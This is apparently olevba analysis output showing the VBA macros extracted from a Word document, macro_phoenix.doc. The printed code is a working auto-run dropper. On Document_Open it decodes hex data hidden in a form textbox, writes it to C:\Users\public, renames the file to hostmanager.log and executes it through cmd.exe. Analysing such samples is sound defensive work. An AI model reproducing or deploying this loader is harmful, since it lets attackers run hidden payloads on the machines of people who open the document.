olevba 0.60.2 on Python 3.12.3 - http://decalage.info/python/oletools
===============================================================================
FILE: macro_phoenix.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: macro_phoenix.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub POL(filePath As String)
    Shell "cmd.exe /C """ & filePath & """", vbNormalFoc
End Sub

Sub RN(oldName As String, newName As String)
    If Dir(oldName) = "" Then
        Exit Sub
    End If
    
    If Dir(newName) <> "" Then
        Exit Sub
    End If
    
    Name oldName As newName
    
    If Dir(newName) <> "" Then
    Else
    End If
End Sub

Function HH(hexString As String) As Byte()
On Error GoTo Error_
    Dim byteArray() As Byte
    Dim i As Long
    Dim hexByte As String
    
    hexString = Replace(hexString, " ", "")
    
    If Len(hexString) Mod 2 <> 0 Then
        hexString = "0" & hexString
    End If

    ReDim byteArray((Len(hexString) \ 2) - 1)

    For i = 0 To UBound(byteArray)
        hexByte = Mid(hexString, i * 2 + 1, 2)
        byteArray(i) = CByte("&H" & hexByte)
    Next i
    
    HH = byteArray
Error_:
End Function


Sub main()
    On Error Resume Next
    
    

    Dim path As String
    path = "C:\\Users\\public\\hostmanager.log"
    
    POL (path)
    
    Dim path_ As String
    path_ = "C:\\Users\\public\\hostmanager.png"
    
    Dim path_2 As String
    path_2 = "C:\\Users\\public\\hostmanager.txt"
    
    
    Dim base64String As String
    base64String = UserForm1.TextBox1.Text

    Dim binaryData() As Byte
    binaryData = HH(base64String)

    Dim fileNum As Integer
    fileNum = FreeFile
    Open path_2 For Binary Access Write As #fileNum
    Put #fileNum, , binaryData
    Close #fileNum
    
    RN path_2, path_
    RN path_, path
    
    POL (path)
    
End Sub

Sub Document_Open()
    main
End Sub





-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: macro_phoenix.doc - OLE stream: 'Macros/VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub TextBox1_Change()

End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'macro_phoenix.doc' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

